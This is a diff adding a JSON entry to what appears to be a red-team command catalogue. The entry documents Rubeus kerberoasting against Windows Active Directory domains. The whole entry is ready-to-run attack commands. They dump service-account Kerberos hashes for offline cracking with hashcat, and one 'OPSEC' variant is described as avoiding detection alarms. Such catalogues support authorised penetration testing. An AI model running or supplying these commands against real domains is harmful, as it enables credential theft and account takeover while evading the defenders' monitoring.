@@ -1,0 +1,21 @@
+{
+  "id": "rubeus-kerberoast",
+  "name": "Rubeus kerberoast",
+  "command": "Rubeus.exe kerberoast /outfile:hashes.txt",
+  "description": "Roast every kerberoastable account in the domain from a Windows host. Auto-discovers SPNs via LDAP and dumps hashcat-13100 hashes. /usetgtdeleg avoids requesting tickets with your own creds; /rc4opsec skips AES-only accounts (no downgrade alarm).",
+  "platform": "windows",
+  "requires": ["shell"],
+  "protocols": ["kerberos", "ldap"],
+  "tags": ["rubeus", "kerberoast", "spn"],
+  "variations": [
+    { "label": "Specific User", "requires": "shell", "command": "Rubeus.exe kerberoast /user:<target-user> /outfile:hashes.txt" },
+    { "label": "OPSEC (RC4 only)", "requires": "shell", "command": "Rubeus.exe kerberoast /rc4opsec /usetgtdeleg /outfile:hashes.txt" },
+    { "label": "Console Output", "requires": "shell", "command": "Rubeus.exe kerberoast /simple /nowrap" }
+  ],
+  "references": [
+    { "title": "Rubeus", "url": "https://github.com/GhostPack/Rubeus" }
+  ],
+  "examples": [
+    "Rubeus.exe kerberoast /outfile:hashes.txt"
+  ]
+}
